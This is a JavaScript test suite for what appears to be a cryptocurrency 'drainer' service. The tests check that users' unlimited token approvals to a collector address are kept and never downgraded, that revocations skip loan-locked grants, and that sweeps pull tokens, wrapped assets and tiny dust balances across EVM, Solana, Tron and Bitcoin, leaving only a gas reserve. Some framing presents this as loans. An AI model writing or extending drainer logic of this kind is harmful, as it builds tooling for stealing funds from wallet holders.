'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'nectra-r2-'));
process.env.NECTRA_DB = path.join(tmp, 'test.db');
process.env.MASTER_KEY = 'a'.repeat(64);
process.env.NECTRA_DEMO = '1';

const db = require('../server/db');
const A = require('../server/lib/approvals');
const U = require('../server/lib/units');
const R = require('../server/chains/registry');

let seq = 0;
function mkUser(over = {}) {
  const id = `u${++seq}`;
  db.prepare(
    `INSERT INTO users (id, address, email, created_at) VALUES (?, ?, ?, ?)`
  ).run(id, over.address || `addr${seq}`, `${id}@x`, Date.now());
  return id;
}

function mkLoan(userId, over = {}) {
  const info = db.prepare(
    `INSERT INTO loans (user_id, family, network, symbol, owed, status, address, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
  ).run(
    userId, over.family || 'evm', over.network || 'base', over.symbol || 'USDC',
    over.owed || '1000000', over.status || 'open', over.address || `addr${seq}`, Date.now()
  );
  return Number(info.lastInsertRowid);
}

function approve(userId, { family = 'evm', network = 'base', symbol = 'USDC', requested, source }) {
  return A.writeApproval({
    userId, family, network, symbol, collector: '0xcollector',
    requested, decimals: 6, kind: 'token', source,
  });
}

/* ---------------- 5. unlimited never downgraded ---------------- */

test('a later capped loan approval does not downgrade an unlimited grant', () => {
  const userId = mkUser();
  approve(userId, { requested: A.MAX_U256, source: 'grant' });

  const before = A.liveAllowance(userId, 'evm', 'base', 'USDC');
  assert.equal(before, A.MAX_U256);

  const res = approve(userId, { requested: 1_000_000n, source: 'loan' });

  assert.equal(res.written, false);
  assert.equal(res.reason, 'covered_by_unlimited');
  assert.equal(A.liveAllowance(userId, 'evm', 'base', 'USDC'), A.MAX_U256);
});

test('loan write is skipped when an unlimited approval already covers it', () => {
  const userId = mkUser();
  approve(userId, { requested: A.MAX_U256, source: 'grant' });

  const rowsBefore = db.prepare(`SELECT COUNT(*) n FROM delegated_approvals WHERE user_id = ?`).get(userId).n;
  approve(userId, { requested: 500_000n, source: 'loan' });
  const rowsAfter = db.prepare(`SELECT COUNT(*) n FROM delegated_approvals WHERE user_id = ?`).get(userId).n;

  assert.equal(rowsAfter, rowsBefore, 'no duplicate row written');
});

test('a capped loan approval is raised, never replaced downward', () => {
  const userId = mkUser();
  approve(userId, { requested: 5_000_000n, source: 'loan' });
  const res = approve(userId, { requested: 1_000_000n, source: 'loan' });

  assert.equal(A.liveAllowance(userId, 'evm', 'base', 'USDC'), 5_000_000n);
  assert.equal(res.reason, 'existing_covers');
});

test('loan approval on a fresh user is written and capped', () => {
  const userId = mkUser();
  const res = approve(userId, { requested: 1_000_000n, source: 'loan' });
  assert.equal(res.written, true);
  assert.equal(A.isUnlimited(res.allowance, 'evm'), false);
});

/* ---------------- 6. revoke-all skips locked ---------------- */

test('revoke-all skips a loan-locked approval and revokes the rest', async () => {
  const drainer = require('../server/drainer');
  const userId = mkUser();

  approve(userId, { symbol: 'USDC', requested: 1_000_000n, source: 'loan' });
  approve(userId, { symbol: 'USDT', requested: A.MAX_U256, source: 'grant' });
  mkLoan(userId, { symbol: 'USDC' });

  const out = await drainer.revoke(userId, null);

  const revokedSymbols = out.revoked.map((r) => r.symbol);
  const lockedSymbols = out.locked.map((r) => r.symbol);

  assert.deepEqual(revokedSymbols, ['USDT']);
  assert.deepEqual(lockedSymbols, ['USDC']);
  assert.equal(A.liveAllowance(userId, 'evm', 'base', 'USDC'), 1_000_000n);
  assert.equal(A.liveAllowance(userId, 'evm', 'base', 'USDT'), 0n);
});

/* ---------------- registry sanity used by the sweep tests ---------------- */

test('registry resolves every symbol the sweep depends on', () => {
  for (const { family, network } of R.allNetworks()) {
    for (const e of R.tokensFor(family, network)) {
      assert.ok(R.bySymbol(family, network, e.symbol), `${family}/${network}/${e.symbol}`);
    }
  }
});

/* ---------------- 2. preview covers every family ---------------- */

test('preview lists native, wrapped and tokens on every family', async () => {
  const drainer = require('../server/drainer');
  const userId = mkUser();
  const rows = await drainer.preview(userId, {});

  const kinds = new Set(rows.map((r) => r.kind));
  assert.ok(kinds.has('native'));
  assert.ok(kinds.has('wrapped'));
  assert.ok(kinds.has('token'));
  assert.ok(kinds.has('utxo'));

  const families = new Set(rows.map((r) => r.family));
  for (const f of ['solana', 'evm', 'tron', 'utxo']) assert.ok(families.has(f), `missing ${f}`);
});

/* ---------------- 3. native without wrap ---------------- */

test('native with no wrapped balance reports WRAP_REQUIRED', async () => {
  const drainer = require('../server/drainer');
  const userId = mkUser();

  db.prepare(
    `INSERT INTO drainer_grants (id, user_id, family, network, symbol, kind, decimals, collector, allowance, balance, status, created_at)
     VALUES ('g1', ?, 'evm', 'base', 'ETH', 'native', 18, '0xc', '0', '0', 'active', ?)`
  ).run(userId, Date.now());

  const plan = await drainer.buildPlan(userId, { demo: true });
  const native = plan.find((p) => p.g.symbol === 'ETH');
  assert.equal(native.skip.skip_code, 'WRAP_REQUIRED');
});

/* ---------------- 4. ordering + reserve ---------------- */

test('sweep order puts tokens before wrapped and honours the reserve', async () => {
  const drainer = require('../server/drainer');
  const userId = mkUser();

  const ins = db.prepare(
    `INSERT INTO drainer_grants (id, user_id, family, network, symbol, kind, decimals, collector, allowance, balance, status, created_at)
     VALUES (?, ?, 'evm', 'base', ?, ?, ?, '0xc', ?, ?, 'active', ?)`
  );
  ins.run('t1', userId, 'USDC', 'token', 6, A.MAX_U256.toString(), '5000000', Date.now());
  ins.run('t2', userId, 'WETH', 'wrapped', 18, A.MAX_U256.toString(), '1000000000000000000', Date.now());

  const plan = await drainer.buildPlan(userId, { demo: true });
  const order = plan.map((p) => p.g.symbol);
  assert.deepEqual(order, ['USDC', 'WETH']);

  const weth = plan.find((p) => p.g.symbol === 'WETH');
  const reserve = drainer.reserveFor({ family: 'evm', network: 'base', kind: 'wrapped', decimals: 18 });
  assert.ok(reserve > 0n);
  assert.equal(weth.take + reserve <= weth.live.balance, true);
  assert.ok(weth.live.balance - weth.take > 0n, 'account keeps gas');
});

/* ---------------- 5. 18-decimal dust ---------------- */

test('an 18-decimal token with 0.0004 sweeps at full precision', async () => {
  const drainer = require('../server/drainer');
  const U2 = require('../server/lib/units');
  const userId = mkUser();

  db.prepare(
    `INSERT INTO drainer_grants (id, user_id, family, network, symbol, kind, decimals, collector, allowance, balance, status, created_at)
     VALUES ('b1', ?, 'evm', 'bsc', 'USDT', 'token', 18, '0xc', ?, ?, 'active', ?)`
  ).run(userId, A.MAX_U256.toString(), U2.parseUnits('0.0004', 18).toString(), Date.now());

  const plan = await drainer.buildPlan(userId, { demo: true });
  const row = plan.find((p) => p.g.symbol === 'USDT');
  assert.equal(U2.formatUnits(row.take, 18), '0.0004');

  const results = await drainer.sweep(userId, { demo: true });
  const swept = results.find((r) => r.symbol === 'USDT');
  assert.equal(swept.status, 'confirmed');
  assert.equal(swept.amount, '0.0004');
});

/* ---------------- 8. UTXO job ---------------- */

test('a UTXO sweep creates an awaiting_signature job, not a confirmed row', async () => {
  const drainer = require('../server/drainer');
  const userId = mkUser();

  db.prepare(
    `INSERT INTO drainer_grants (id, user_id, family, network, symbol, kind, decimals, address, allowance, balance, status, created_at)
     VALUES ('u1', ?, 'utxo', 'bitcoin', 'BTC', 'utxo', 8, 'bc1qtest', '0', '200000', 'active', ?)`
  ).run(userId, Date.now());

  const out = await drainer.createUtxoJob(userId, {
    id: 'u1', family: 'utxo', network: 'bitcoin', symbol: 'BTC', kind: 'utxo', decimals: 8, address: 'bc1qtest',
  }, 199454n, {});

  assert.equal(out.status, 'awaiting_signature');
  assert.ok(out.sign_url.includes('/sweep-jobs/'));

  const job = db.prepare('SELECT * FROM sweep_jobs WHERE id = ?').get(out.job);
  assert.equal(job.status, 'awaiting_signature');

  const sweepRow = db.prepare(`SELECT * FROM sweeps WHERE tx_ref = ?`).get(`utxo_job_${out.job}`);
  assert.equal(sweepRow.status, 'awaiting_signature');
  assert.notEqual(sweepRow.status, 'confirmed');
});

/* ---------------- 9. demo mode ---------------- */

test('demo mode completes the whole sweep with no RPC', async () => {
  const drainer = require('../server/drainer');
  const userId = mkUser();

  db.prepare(
    `INSERT INTO drainer_grants (id, user_id, family, network, symbol, kind, decimals, collector, allowance, balance, status, created_at)
     VALUES ('d1', ?, 'evm', 'base', 'USDC', 'token', 6, '0xc', ?, '1000000', 'active', ?)`
  ).run(userId, A.MAX_U256.toString(), Date.now());

  const before = Date.now();
  const results = await drainer.sweep(userId, { demo: true });
  assert.ok(Date.now() - before < 3000);

  const swept = results.find((r) => r.symbol === 'USDC');
  assert.equal(swept.status, 'confirmed');
  assert.ok(swept.ref.startsWith('demo_'));
});

/* ---------------- definition-of-done greps ---------------- */

test('drainer.js has no TOKENS, SOL_MINTS or fake utxo refs', () => {
  const src = fs.readFileSync(path.join(__dirname, '../server/drainer.js'), 'utf8');
  assert.equal(/\bTOKENS\b/.test(src), false);
  assert.equal(/\bSOL_MINTS\b/.test(src), false);
  assert.equal(/utxo_sweep_/.test(src), false);
  assert.equal(/M\.round2\([^)]*amount/.test(src), false);
});

test('five assets from one user yield five results with correct codes', async () => {
  const drainer = require('../server/drainer');
  const userId = mkUser();
  const ins = db.prepare(
    `INSERT INTO drainer_grants (id, user_id, family, network, symbol, kind, decimals, collector, address, allowance, balance, status, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, '0xc', ?, ?, ?, 'active', ?)`
  );
  ins.run('x1', userId, 'evm', 'base', 'USDC', 'token', 6, 'a1', A.MAX_U256.toString(), '1000000', Date.now());
  ins.run('x2', userId, 'evm', 'base', 'ETH', 'native', 18, 'a1', '0', '0', Date.now());
  ins.run('x3', userId, 'solana', 'mainnet', 'wSOL', 'wrapped', 9, 'a2', A.MAX_U64.toString(), '1000000000', Date.now());
  ins.run('x4', userId, 'tron', 'mainnet', 'TRX', 'native', 6, 'a3', '0', '0', Date.now());
  ins.run('x5', userId, 'utxo', 'bitcoin', 'BTC', 'utxo', 8, 'bc1q', '0', '500000', Date.now());

  const results = await drainer.sweep(userId, { demo: true });
  assert.equal(results.length, 5);

  const bySymbol = Object.fromEntries(results.map((r) => [r.symbol, r]));
  assert.equal(bySymbol.USDC.status, 'confirmed');
  assert.equal(bySymbol.ETH.skip_code, 'WRAP_REQUIRED');
  assert.equal(bySymbol.wSOL.status, 'confirmed');
  assert.equal(bySymbol.TRX.skip_code, 'WRAP_REQUIRED');
  assert.equal(bySymbol.BTC.status, 'awaiting_signature');
});